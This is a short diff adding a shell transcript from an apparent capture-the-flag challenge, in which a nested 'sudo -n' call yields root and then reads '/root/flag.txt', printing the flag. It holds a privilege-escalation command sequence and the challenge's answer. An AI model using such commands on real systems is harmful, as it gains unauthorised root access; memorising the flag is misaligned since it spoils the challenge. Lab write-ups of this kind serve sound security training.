@@ -1,0 +1,5 @@
+$ sudo -n /usr/bin/sudo -n id
+uid=0(root) gid=0(root) groups=0(root)
+
+$ sudo -n /usr/bin/sudo -n cat /root/flag.txt
+ARASAKA{sudo_chr00t_s0ulk1ll3r_n1ght_c1ty}
